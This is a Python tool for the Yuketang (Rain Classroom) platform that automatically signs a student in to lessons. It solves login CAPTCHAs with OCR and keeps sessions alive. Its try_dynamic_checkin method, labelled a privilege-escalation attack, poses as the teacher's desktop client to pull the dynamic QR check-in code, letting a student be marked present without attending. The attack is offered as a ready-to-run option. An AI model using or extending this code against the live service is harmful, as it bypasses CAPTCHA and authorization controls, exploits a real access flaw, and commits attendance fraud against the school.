import requests
import qrcode
import time
import json
import sys
import os
import re
import asyncio
import argparse
from io import BytesIO
from datetime import datetime

# 检测可选依赖是否可用
try:
    from playwright.async_api import async_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    async_playwright = None
    HAS_PLAYWRIGHT = False

try:
    import ddddocr
    from PIL import Image
    HAS_AUTO_LOGIN = HAS_PLAYWRIGHT
except ImportError:
    HAS_AUTO_LOGIN = False

# ========== 用户配置 ==========
BASE_DOMAIN = "changjiang.yuketang.cn"  # 默认长江雨课堂，自行更换
AUTO_LOGIN_PHONE = ""
AUTO_LOGIN_PSWD = ""
CHECKIN_COOLDOWN_MINUTES = 30
# ==============================

GLOBAL_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
BASE_URL = f"https://{BASE_DOMAIN}"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(SCRIPT_DIR, "yuketang_session.json")
BROWSER_SYNC_WAIT_SECONDS = 6

def log(msg):
    print(f"[{datetime.now().strftime('%m-%d %H:%M:%S')}] {msg}")


def read_json_file(path, default):
    try:
        with open(path, "r") as f:
            return json.load(f)
    except:
        return default


def write_json_file(path, data):
    with open(path, "w") as f:
        json.dump(data, f, ensure_ascii=False)


def load_state_dict():
    state = read_json_file(STATE_FILE, {})
    return state if isinstance(state, dict) else {}


def normalize_cookie_record(cookie):
    if not isinstance(cookie, dict) or "name" not in cookie:
        return None
    expires = cookie.get("expires")
    try:
        expires = int(expires) if expires not in (None, "", 0, "0") else None
    except:
        expires = None
    return {
        "name": cookie["name"],
        "value": cookie.get("value", ""),
        "domain": cookie.get("domain") or BASE_DOMAIN,
        "path": cookie.get("path") or "/",
        "expires": expires,
        "secure": bool(cookie.get("secure", False)),
    }


def persist_cookie_records(cookies):
    state = load_state_dict()
    future = int(time.time()) + 86400 * 365
    normalized = []
    for cookie in cookies:
        item = normalize_cookie_record(cookie)
        if not item:
            continue
        item["expires"] = item["expires"] or future
        normalized.append(item)
    state["cookies"] = normalized
    write_json_file(STATE_FILE, state)


def persist_browser_state(storage_state):
    state = load_state_dict()
    state["browser_state"] = storage_state
    write_json_file(STATE_FILE, state)


def load_browser_state():
    state = load_state_dict()
    browser_state = state.get("browser_state")
    if isinstance(browser_state, dict):
        return browser_state
    return None


# ==================== 自动登录模块（内联） ====================

class AutoLogin:
    """基于 Playwright + ddddocr 的全自动账密登录，含验证码破解"""

    def __init__(self, phone, password):
        self.phone = phone
        self.password = password
        self.ocr = ddddocr.DdddOcr(show_ad=False)
        self.det = ddddocr.DdddOcr(det=True, show_ad=False)
        self.slider_ocr = ddddocr.DdddOcr(det=False, ocr=False, show_ad=False)
        self.error_msg = None  # 用于记录账密错误等业务异常

    def _select_spots(self, char_map, instruction, attempt):
        """坐标排序：语义占位 + 地理回填"""
        try:
            target = re.sub(r"请依次点击|:|：|\"|'| ", "", instruction)
            # 物理去重
            clean = []
            for item in char_map:
                if not any(((item['x']-e['x'])**2 + (item['y']-e['y'])**2)**0.5 < 25 for e in clean):
                    clean.append(item)
            # 语义占位
            spots = [None] * len(target)
            used = set()
            for i, ch in enumerate(target):
                for item in clean:
                    if id(item) not in used and (ch in item['char'] or item['char'] in ch):
                        spots[i] = item; used.add(id(item)); break
            # 地理回填
            avail = [x for x in clean if id(x) not in used]
            s = attempt % 4
            if s == 0: avail.sort(key=lambda x: x['x'])
            elif s == 1: avail.sort(key=lambda x: x['x'], reverse=True)
            elif s == 2: avail.sort(key=lambda x: x['y'])
            else: avail.sort(key=lambda x: x['x'] + x['y'])
            ptr = 0
            for i in range(len(spots)):
                if spots[i] is None and ptr < len(avail):
                    spots[i] = avail[ptr]; ptr += 1
            return [x for x in spots if x is not None]
        except:
            return char_map[:3]

    async def run(self):
        """执行自动登录，成功则写入 session 文件并返回 True"""
        log("[*] 正在启动自动化登录...")
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True)
            ctx = await browser.new_context(user_agent=GLOBAL_UA)
            page = await ctx.new_page()

            await page.goto(f"{BASE_URL}/v2/web/index")
            await asyncio.sleep(2)
            try:
                await page.locator('img.changeImg, .login-type-img').first.click(timeout=3000)
            except:
                pass
            await page.fill('input[name="loginname"]', self.phone)
            await page.fill('input[type="password"]', self.password)
            
            # 监听登录接口的原始响应，捕获账密错误
            async def handle_response(response):
                if "/api/v3/user/login/password" in response.url:
                    try:
                        if "application/json" in response.headers.get("content-type", "").lower():
                            data = await response.json()
                            code = data.get('code')
                            # -10 代表需要验证码，0 代表成功。其他 code 均视为业务报错
                            if code is not None and code != 0 and code != -10:
                                self.error_msg = data.get('msg') or data.get('message') or f"错误代码: {code}"
                    except: pass
            page.on("response", handle_response)
            
            await page.locator('.submit-btn.login-btn').click()

            ok = False
            for attempt in range(15):
                await asyncio.sleep(2.5)
                
                # 检查页面上所有可能的红色错误提示条
                try:
                    # 获取所有 el-message__content 或者包含 err/error 字样的可见元素文本
                    msg_els = await page.locator('.el-message__content, .err-msg, .error-msg, [role="alert"]').all()
                    for el in msg_els:
                        if await el.is_visible():
                            txt = await el.text_content()
                            if txt and len(txt.strip()) > 0:
                                self.error_msg = txt.strip()
                                break
                except: pass

                # 若捕获到业务错误（如密码错、手机号未注册等），终止流程
                if self.error_msg:
                    log(f"[-] 登录失败: {self.error_msg}")
                    break

                if any(c['name'] == 'sessionid' for c in await ctx.cookies()):
                    ok = True; break

                frame = next((f for f in page.frames if 'turing.captcha' in f.url), None)
                if not frame:
                    continue

                try:
                    instr = ""
                    for sel in ['#instructionText', '.tc-title-words', '.tc-instruction-text']:
                        try:
                            t = await frame.locator(sel).first.text_content(timeout=1000)
                            if t: instr = t; break
                        except:
                            pass
                    if not instr:
                        await frame.evaluate("document.querySelector('#reload, .tc-action--refresh').click()")
                        continue

                    if '滑' in instr:
                        await self._handle_slider(frame)
                    elif '点击' in instr:
                        await self._handle_click(frame, instr, attempt)

                    await asyncio.sleep(1.5)
                    if await frame.locator('#slideBg').is_visible():
                        await frame.evaluate("document.querySelector('#reload, .tc-action--refresh').click()")
                except:
                    try:
                        await frame.evaluate("document.querySelector('#reload, .tc-action--refresh').click()")
                    except:
                        pass

            if ok:
                try:
                    await page.goto(f"{BASE_URL}/v2/web/index", wait_until="load", timeout=20000)
                except:
                    pass
                await asyncio.sleep(BROWSER_SYNC_WAIT_SECONDS)
            else:
                await asyncio.sleep(2)
            cookies = await ctx.cookies()
            storage_state = await ctx.storage_state()
            await browser.close()

            if ok and any(c['name'] == 'sessionid' for c in cookies):
                persist_cookie_records(cookies)
                persist_browser_state(storage_state)
                log("[+] 自动登录成功，Session 已保存")
                return True
            log("[-] 自动登录未能通过验证")
            return False

    async def _handle_slider(self, frame):
        """处理滑块验证"""
        s_bg = await frame.locator('#slideBg').get_attribute('style')
        s_bk = await frame.locator('#slideBlock').get_attribute('style')
        m_bg = re.search(r'url\("?(.+?)"?\)', s_bg.replace('&quot;', '"'))
        m_bk = re.search(r'url\("?(.+?)"?\)', s_bk.replace('&quot;', '"'))
        if m_bg and m_bk:
            import urllib.request
            def dl(u): return urllib.request.urlopen(urllib.request.Request(u if u.startswith('http') else 'https:'+u, headers={'User-Agent': 'Mozilla'})).read()
            bg_b, bk_b = dl(m_bg.group(1)), dl(m_bk.group(1))
            res = self.slider_ocr.slide_match(bk_b, bg_b, simple_target=True)
            box = await frame.locator('#slideBg').bounding_box()
            if box:
                scale = box['width'] / Image.open(BytesIO(bg_b)).size[0]
                btn = frame.locator('.tc-action--normal, #tcOperation').first
                await btn.drag_to(btn, source_position={'x': 0, 'y': 0}, target_position={'x': res['target'][0]*scale, 'y': 0})

    async def _handle_click(self, frame, instr, attempt):
        """处理文字点选验证"""
        s_bg = await frame.locator('#slideBg').get_attribute('style')
        m = re.search(r'url\("?(.+?)"?\)', s_bg.replace('&quot;', '"'))
        if not m:
            return
        import urllib.request
        url = m.group(1) if m.group(1).startswith('http') else 'https:' + m.group(1)
        bg_b = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': 'Mozilla'})).read()
        poses = self.det.detection(bg_b)
        img = Image.open(BytesIO(bg_b))
        w, h = img.size
        chars = []
        for p in poses:
            if (p[2]-p[0])*(p[3]-p[1]) < 400:
                continue
            crop = img.crop(p); buf = BytesIO(); crop.save(buf, 'PNG')
            ch = self.ocr.classification(buf.getvalue())
            chars.append({"char": ch, "x": (p[0]+p[2])/2, "y": (p[1]+p[3])/2})
        elem = frame.locator('#slideBg')
        box = await elem.bounding_box()
        if box and chars:
            sx, sy = box['width']/w, box['height']/h
            for s in self._select_spots(chars, instr, attempt):
                await elem.click(position={'x': s['x']*sx, 'y': s['y']*sy}, force=True)
                await asyncio.sleep(0.5)
            try:
                await frame.evaluate("document.querySelector('.verify-btn.show').click()")
            except:
                pass


# ==================== 主程序模块 ====================

class YuketangHelper:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": GLOBAL_UA, "xtbz": "ykt", "Content-Type": "application/json"})
        self.sessionid = None
        self.csrftoken = None

    def _load_state(self):
        return load_state_dict()

    def _save_state(self, state):
        write_json_file(STATE_FILE, state)

    def _refresh_session_fields(self):
        self.sessionid = self.session.cookies.get('sessionid')
        self.csrftoken = self.session.cookies.get('csrftoken')
        self.session.headers.update({"User-Agent": GLOBAL_UA, "xtbz": "ykt", "Content-Type": "application/json"})
        if self.csrftoken:
            self.session.headers.update({"X-CSRFToken": self.csrftoken})
        else:
            self.session.headers.pop("X-CSRFToken", None)

    def _cookie_records_from_jar(self):
        cookies = []
        for c in self.session.cookies:
            cookies.append({
                "name": c.name,
                "value": c.value,
                "domain": c.domain,
                "path": c.path,
                "expires": c.expires,
                "secure": bool(c.secure),
            })
        return cookies

    def _set_cookie_records(self, cookies, clear=False):
        if clear:
            self.session.cookies.clear()
        for c in cookies:
            item = normalize_cookie_record(c)
            if not item:
                continue
            kwargs = {"domain": item["domain"], "path": item["path"]}
            if item["expires"]:
                kwargs["expires"] = int(item["expires"])
            self.session.cookies.set(item["name"], item["value"], **kwargs)
        self._refresh_session_fields()

    def _load_cookies_from_state(self):
        raw = self._load_state()
        if isinstance(raw, list):
            c_list = raw
        elif isinstance(raw, dict):
            c_list = raw.get("cookies", [])
            if not c_list and 'sessionid' in raw:
                c_list = [
                    {"name": k, "value": v, "domain": BASE_DOMAIN, "path": "/"}
                    for k, v in raw.items()
                    if isinstance(v, str)
                ]
        else:
            return False
        self._set_cookie_records(c_list, clear=True)
        return bool(self.session.cookies)

    def _probe_session(self):
        if not self.session.cookies.get('sessionid'):
            return False
        try:
            self.session.get(f"{BASE_URL}/v2/web/index", timeout=10)
            self._refresh_session_fields()
            resp = self.session.get(f"{BASE_URL}/api/v3/user/basic-info", timeout=10)
            if "application/json" not in resp.headers.get("Content-Type", ""):
                return False
            data = resp.json()
            if isinstance(data, dict) and (data.get("code") == 0 or data.get("success")):
                self._refresh_session_fields()
                self.save_session()
                return True
        except:
            return False
        return False

    def _cookies_for_playwright(self):
        result = []
        for c in self.session.cookies:
            item = {
                "name": c.name,
                "value": c.value,
                "path": c.path or "/",
                "secure": bool(c.secure),
            }
            if c.expires:
                item["expires"] = int(c.expires)
            if c.domain:
                item["domain"] = c.domain
            else:
                item["url"] = BASE_URL
            result.append(item)
        return result

    async def _sync_with_browser(self, storage_state=None, seed_cookies=None):
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True)
            context_kwargs = {"user_agent": GLOBAL_UA}
            if storage_state:
                context_kwargs["storage_state"] = storage_state
            ctx = await browser.new_context(**context_kwargs)
            if seed_cookies:
                await ctx.add_cookies(seed_cookies)
            page = await ctx.new_page()
            try:
                await page.goto(f"{BASE_URL}/v2/web/index", wait_until="load", timeout=25000)
            except:
                try:
                    await page.goto(f"{BASE_URL}/v2/web/index", timeout=25000)
                except:
                    pass
            try:
                await page.wait_for_load_state("networkidle", timeout=10000)
            except:
                pass
            try:
                await page.evaluate(
                    """async () => {
                        const urls = [
                            '/api/v3/user/basic-info',
                            '/api/v3/classroom/on-lesson-upcoming-exam'
                        ];
                        for (const url of urls) {
                            try {
                                await fetch(url, {credentials: 'include'});
                            } catch (e) {}
                        }
                    }"""
                )
            except:
                pass
            await asyncio.sleep(BROWSER_SYNC_WAIT_SECONDS)
            cookies = await ctx.cookies()
            storage_state = await ctx.storage_state()
            await browser.close()
            return cookies, storage_state

    def _bootstrap_browser_state(self):
        if not HAS_PLAYWRIGHT or not self.session.cookies.get('sessionid'):
            return False
        try:
            cookies, storage_state = asyncio.run(
                self._sync_with_browser(seed_cookies=self._cookies_for_playwright())
            )
        except Exception as e:
            log(f"[!] 浏览器态同步失败: {e}")
            return False
        if not cookies:
            return False
        self._set_cookie_records(cookies, clear=True)
        persist_browser_state(storage_state)
        if self._probe_session():
            log("[+] 已同步浏览器登录态")
            return True
        return False

    def _rehydrate_session_from_browser_state(self):
        browser_state = load_browser_state()
        if not HAS_PLAYWRIGHT or not browser_state:
            return False
        log("[*] Cookie 已失效，尝试用浏览器登录态恢复...")
        try:
            cookies, storage_state = asyncio.run(
                self._sync_with_browser(storage_state=browser_state)
            )
        except Exception as e:
            log(f"[!] 浏览器登录态恢复失败: {e}")
            return False
        if not any(c.get('name') == 'sessionid' for c in cookies):
            return False
        self._set_cookie_records(cookies, clear=True)
        persist_browser_state(storage_state)
        if self._probe_session():
            log("[+] 已从浏览器登录态恢复会话")
            return True
        return False

    def save_session(self):
        """持久化 Cookie 和签到记录，增强 Session 提权逻辑"""
        self._refresh_session_fields()
        persist_cookie_records(self._cookie_records_from_jar())

    def load_session(self):
        """从文件恢复 Session，兼容多种历史格式"""
        try:
            if self._load_cookies_from_state() and self._probe_session():
                if HAS_PLAYWRIGHT and not load_browser_state():
                    self._bootstrap_browser_state()
                return True
            return self._rehydrate_session_from_browser_state()
        except:
            return False

    def _check_cooldown(self, lesson_id):
        """检查是否在冷却期内"""
        state = self._load_state()
        last = state.get("last_checkin") if isinstance(state, dict) else None
        if not last or str(last.get("lesson_id")) != str(lesson_id):
            return False
        try:
            elapsed = (datetime.now() - datetime.strptime(last["time"], "%Y-%m-%d %H:%M:%S")).total_seconds() / 60
            if elapsed < CHECKIN_COOLDOWN_MINUTES:
                log(f"[*] 课堂 {lesson_id} 在 {int(elapsed)} 分钟前已签到，跳过")
                return True
        except:
            pass
        return False

    def _record_checkin(self, lesson_id):
        """记录签到"""
        state = self._load_state()
        if not isinstance(state, dict):
            state = {}
        state["last_checkin"] = {"lesson_id": str(lesson_id), "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        self._save_state(state)

    def auto_login(self, phone, password):
        """执行自动化登录（内联调用，不再依赖子进程）"""
        if not HAS_AUTO_LOGIN:
            log("[!] 未安装 ddddocr/playwright，无法使用自动登录")
            return False
        bot = AutoLogin(phone, password)
        return asyncio.run(bot.run())

    def get_login_qrcode(self):
        log("[*] 正在请求微信授权参数...")
        try:
            resp = self.session.post(f"{BASE_URL}/api/v3/user/login/wechat-auth-param", json={})
            self._refresh_session_fields()
            self.csrftoken = self.session.cookies.get('csrftoken') or resp.cookies.get('csrftoken')
            data = resp.json()
            if data['code'] != 0:
                return None, None
            auth = data['data']
            login_url = f"https://open.weixin.qq.com/connect/qrconnect?appid={auth['appId']}&redirect_uri={auth['redirectUri']}&response_type=code&scope=snsapi_login&state={auth['state']}"
            r_wx = requests.get(login_url + "&login_type=jssdk&self_redirect=true", headers={"User-Agent": GLOBAL_UA})
            uuid = re.search(r'src="/connect/qrcode/([^"]+)"', r_wx.text).group(1)
            qr = qrcode.QRCode()
            qr.add_data(f"https://open.weixin.qq.com/connect/confirm?uuid={uuid}")
            qr.make(fit=True)
            qr.print_ascii(invert=True)
            log("[*] 请使用微信扫描上方二维码登录")
            return auth['state'], uuid
        except:
            return None, None

    def wait_for_login_and_callback(self, state, uuid):
        log("[*] 等待手机端确认...")
        while True:
            try:
                content = requests.get(f"https://lp.open.weixin.qq.com/connect/l/qrconnect?uuid={uuid}&_={int(time.time()*1000)}", timeout=30).text
                if 'window.wx_errcode=405' in content:
                    code = re.search(r"window.wx_code='([^']+)'", content).group(1)
                    log("[+] 微信授权成功")
                    return self._finalize_login(code, state)
                elif 'window.wx_errcode=404' in content:
                    log("[*] 已扫码，请在手机上点击确认")
                elif 'window.wx_errcode=403' in content:
                    return False
                time.sleep(2)
            except KeyboardInterrupt:
                return False
            except:
                time.sleep(5)

    def _finalize_login(self, code, state):
        try:
            self.session.get(f"{BASE_URL}/api/v3/user/login/wechat-web-callback", params={"code": code, "state": state}, allow_redirects=True)
            self._refresh_session_fields()
            if self.session.cookies.get('sessionid'):
                self.save_session()
                if HAS_PLAYWRIGHT:
                    self._bootstrap_browser_state()
                return True
            return False
        except:
            return False

    def get_active_lesson_data(self):
        try:
            self._refresh_session_fields()
            self.session.headers.update({"X-CSRFToken": self.csrftoken, "User-Agent": GLOBAL_UA})
            data = self.session.get(f"{BASE_URL}/api/v3/classroom/on-lesson-upcoming-exam").json()
            active = data.get('data', {}).get('onLessonClassrooms', [])
            self.save_session() # 实时同步状态
            if not active:
                return None, None
            return active[0].get('lessonId'), active[0].get('classroomId')
        except:
            return None, None

    def sign_in(self, lesson_id, classroom_id=None, source=1):
        if self._check_cooldown(lesson_id):
            return
        self._refresh_session_fields()
        payload = {"lessonId": str(lesson_id), "source": source}
        headers = {"X-CSRFToken": self.csrftoken, "xtbz": "ykt", "User-Agent": GLOBAL_UA, "Referer": f"{BASE_URL}/v2/web/index"}
        if classroom_id:
            headers["Referer"] = f"{BASE_URL}/v2/web/studentLog/{classroom_id}"
        try:
            res = self.session.post(f"{BASE_URL}/api/v3/lesson/checkin", headers=headers, json=payload).json()
            if res.get('code') == 0:
                log(f"[+] 签到成功 (课堂: {lesson_id})")
                self._record_checkin(lesson_id)
                self.save_session() # 签到成功后同步最新 Cookie (可能有后端轮转)
            else:
                log(f"[-] 签到失败: {res.get('msg')}")
        except Exception as e:
            log(f"[!] 签到请求异常: {e}")

    def try_dynamic_checkin(self, lesson_id):
        """越权攻击：尝试用学生 Cookie 获取动态二维码暗号并自动签到
        
        逆向桌面端 Electron 源码发现的攻击链路：
        1. POST /api/v3/lesson/checkin {source:10} → 获取 lessonToken
        2. GET /api/v3/lesson/fetch-dynamic-invitation?v=2 → 获取动态暗号
        3. 用暗号完成签到
        """
        log("[*] 尝试越权获取动态签到暗号...")
        self._refresh_session_fields()
        
        # 第一步：以桌面端身份(source=10)获取 lessonToken
        try:
            checkin_url = f"{BASE_URL}/api/v3/lesson/checkin"
            payload = {"lessonId": str(lesson_id), "source": 10}
            resp = self.session.post(checkin_url, json=payload).json()
            
            if resp.get('code') != 0 or not resp.get('data'):
                log(f"[-] 获取 lessonToken 失败: {resp.get('msg', '未知错误')}")
                return False
            
            lesson_token = resp['data'].get('lessonToken')
            role = resp['data'].get('role', '未知')
            log(f"[*] 获取到 lessonToken, 分配角色: {role}")
            
            if not lesson_token:
                log("[-] lessonToken 为空，服务端可能未返回")
                return False
        except Exception as e:
            log(f"[!] 获取 lessonToken 异常: {e}")
            return False
        
        # 第二步：用 Bearer Token 拉取动态暗号
        try:
            headers = {
                "Authorization": f"Bearer {lesson_token}",
                "User-Agent": GLOBAL_UA,
                "xtbz": "ykt",
            }
            inv_url = f"{BASE_URL}/api/v3/lesson/fetch-dynamic-invitation"
            resp2 = self.session.get(inv_url, params={"v": 2}, headers=headers).json()
            
            if resp2.get('code') != 0 or not resp2.get('data'):
                log(f"[-] 越权获取暗号失败: {resp2.get('msg', '服务端拒绝')}")
                log("[*] 服务端可能校验了 role，学生 token 无权限")
                return False
            
            qr_content = resp2['data'].get('qrContent', '')
            if not qr_content:
                log("[-] 返回的 qrContent 为空")
                return False
            
            # 从 qrContent URL 中提取 ticket (5位数字暗号)
            ticket_match = re.search(r'ticket=([A-Za-z0-9]+)', qr_content)
            if not ticket_match:
                log(f"[-] 无法从 qrContent 中提取 ticket: {qr_content}")
                return False
            
            ticket = ticket_match.group(1)
            log(f"[+] 越权成功！获取到动态暗号: {ticket}")
            
        except Exception as e:
            log(f"[!] 获取动态暗号异常: {e}")
            return False
        
        # 第三步：用暗号签到
        return self.manual_ticket_checkin(lesson_id, ticket)

    def manual_ticket_checkin(self, lesson_id, ticket):
        """使用手动输入的 5 位暗号(ticket)完成动态二维码签到"""
        log(f"[*] 正在使用暗号 [{ticket}] 签到...")
        try:
            self._refresh_session_fields()
            # 尝试新接口 (source=14 表示扫码签到)
            payload = {"lessonId": str(lesson_id), "source": 14, "inviteCode": str(ticket)}
            headers = {"X-CSRFToken": self.csrftoken, "User-Agent": GLOBAL_UA, "xtbz": "ykt"}
            
            res = self.session.post(f"{BASE_URL}/api/v3/lesson/checkin", headers=headers, json=payload).json()
            if res.get('code') == 0:
                log(f"[+] 动态签到成功！(课堂: {lesson_id}, 暗号: {ticket})")
                self._record_checkin(lesson_id)
                self.save_session()
                return True
            
            err_msg = res.get('msg', '')
            log(f"[-] 新接口签到失败: {err_msg}")
            
            # 如果新接口返回 DYNAMIC_QR_CHECK_IN_REFUSED，说明暗号已过期
            if 'DYNAMIC_QR' in err_msg.upper():
                log("[!] 暗号已过期或此签到要求动态码")
                return False
            
            # 回退尝试旧接口
            old_payload = {"invite_code": str(ticket), "source": 14}
            res2 = self.session.post(f"{BASE_URL}/api/lesson/web_check_in", headers=headers, json=old_payload).json()
            if res2.get('code') == 0:
                log(f"[+] 动态签到成功（旧接口）！(课堂: {lesson_id})")
                self._record_checkin(lesson_id)
                self.save_session()
                return True
            else:
                log(f"[-] 旧接口也失败: {res2.get('msg', '未知错误')}")
                return False
                
        except Exception as e:
            log(f"[!] 暗号签到异常: {e}")
            return False

    def keep_alive(self):
        try:
            self.session.get(f"{BASE_URL}/v2/web/index", timeout=10)
            self._refresh_session_fields()
            self.session.headers.update({"X-CSRFToken": self.csrftoken, "User-Agent": GLOBAL_UA})
            # 使用基础用户信息接口进行心跳保活，极低服务器开销
            resp = self.session.get(f"{BASE_URL}/api/v3/user/basic-info", timeout=10)
            if resp.json().get('code') == 0:
                log("[+] 会话保活成功")
                self.save_session()
                return True
            return False
        except:
            return False


# ==================== 入口 ====================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="雨课堂自动签到助手")
    parser.add_argument("-a", "--auto", action="store_true", help="自动扫描课堂并签到")
    parser.add_argument("-k", "--keepalive", action="store_true", help="仅执行会话保活")
    parser.add_argument("--qr", action="store_true", help="强制使用二维码扫码登录")
    parser.add_argument("-p", "--phone", type=str, help="手机号（覆盖脚本内置配置）")
    parser.add_argument("-pw", "--password", type=str, help="密码（覆盖脚本内置配置）")
    parser.add_argument("--cooldown", type=int, default=CHECKIN_COOLDOWN_MINUTES, help=f"签到去重冷却时间，分钟（默认 {CHECKIN_COOLDOWN_MINUTES}）")
    parser.add_argument("-s", "--schedule", type=int, metavar="N", help="延迟 N 分钟后开始，每分钟自动检测并签到")
    parser.add_argument("--ticket", type=str, metavar="CODE", help="手动输入 5 位暗号，完成动态二维码签到")
    parser.add_argument("--dynamic", action="store_true", help="尝试越权获取动态暗号并自动签到")
    args = parser.parse_args()

    CHECKIN_COOLDOWN_MINUTES = args.cooldown
    phone = args.phone or AUTO_LOGIN_PHONE
    password = args.password or AUTO_LOGIN_PSWD

    helper = YuketangHelper()
    auth = helper.load_session()

    # 登录策略：自动登录 -> 二维码扫码
    if not auth and not args.qr:
        if HAS_AUTO_LOGIN:
            auth = helper.auto_login(phone, password)
            if auth:
                auth = helper.load_session()
        else:
            log("[*] 未检测到自动登录依赖 (ddddocr/playwright)，跳过自动登录")

    if not auth:
        log("[*] 进入二维码扫码登录...")
        state, uuid = helper.get_login_qrcode()
        if state and helper.wait_for_login_and_callback(state, uuid):
            auth = True

    if not auth:
        log("[!] 所有登录方式均失败，请检查网络或账号配置")
        sys.exit(1)

    # 执行功能
    if args.keepalive:
        helper.keep_alive()
        sys.exit(0)

    if args.auto:
        l_id, c_id = helper.get_active_lesson_data()
        if l_id:
            helper.sign_in(l_id, classroom_id=c_id)
        else:
            log("[-] 当前没有正在进行的课堂")
        sys.exit(0)

    # 手动暗号签到模式
    if args.ticket:
        l_id, c_id = helper.get_active_lesson_data()
        if l_id:
            helper.manual_ticket_checkin(l_id, args.ticket)
        else:
            log("[-] 当前没有正在进行的课堂")
        sys.exit(0)

    # 越权获取动态暗号模式
    if args.dynamic:
        l_id, c_id = helper.get_active_lesson_data()
        if l_id:
            helper.try_dynamic_checkin(l_id)
        else:
            log("[-] 当前没有正在进行的课堂")
        sys.exit(0)

    # 定时签到模式
    if args.schedule is not None:
        delay = args.schedule
        if delay > 0:
            log(f"[*] 将在 {delay} 分钟后开始自动签到循环...")
            time.sleep(delay * 60)
        log("[*] 开始自动签到循环（每 60 秒检测一次，Ctrl+C 退出）")
        try:
            while True:
                l_id, c_id = helper.get_active_lesson_data()
                if l_id:
                    helper.sign_in(l_id, classroom_id=c_id)
                else:
                    log("[-] 当前没有正在进行的课堂，60 秒后重试...")
                time.sleep(60)
        except KeyboardInterrupt:
            log("[*] 已停止定时签到")
        sys.exit(0)

    # 交互模式
    while True:
        print("\n1. 自动扫描签到\n2. 扫码登录\n3. 定时签到\n4. 动态二维码签到（测试）\n5. 手动输入暗号签到\n6. 退出")
        try:
            c = input("> ").strip()
        except (KeyboardInterrupt, EOFError):
            sys.exit(0)
        if c == "1":
            l_id, c_id = helper.get_active_lesson_data()
            if l_id:
                helper.sign_in(l_id, classroom_id=c_id)
            else:
                log("[-] 当前没有正在进行的课堂")
        elif c == "2":
            s, u = helper.get_login_qrcode()
            if s:
                helper.wait_for_login_and_callback(s, u)
        elif c == "3":
            try:
                n = int(input("请输入延迟分钟数 (0 = 立即开始): ").strip())
            except (ValueError, KeyboardInterrupt, EOFError):
                continue
            if n > 0:
                log(f"[*] 将在 {n} 分钟后开始自动签到循环...")
                time.sleep(n * 60)
            log("[*] 开始自动签到循环（每 60 秒检测一次，Ctrl+C 返回菜单）")
            try:
                while True:
                    l_id, c_id = helper.get_active_lesson_data()
                    if l_id:
                        helper.sign_in(l_id, classroom_id=c_id)
                    else:
                        log("[-] 当前没有正在进行的课堂，60 秒后重试...")
                    time.sleep(60)
            except KeyboardInterrupt:
                log("[*] 已停止定时签到，返回菜单")
        elif c == "4":
            l_id, c_id = helper.get_active_lesson_data()
            if l_id:
                helper.try_dynamic_checkin(l_id)
            else:
                log("[-] 当前没有正在进行的课堂")
        elif c == "5":
            l_id, c_id = helper.get_active_lesson_data()
            if not l_id:
                log("[-] 当前没有正在进行的课堂")
                continue
            try:
                ticket = input("请输入 5 位暗号: ").strip()
            except (KeyboardInterrupt, EOFError):
                continue
            if ticket:
                helper.manual_ticket_checkin(l_id, ticket)
        elif c == "6":
            sys.exit(0)
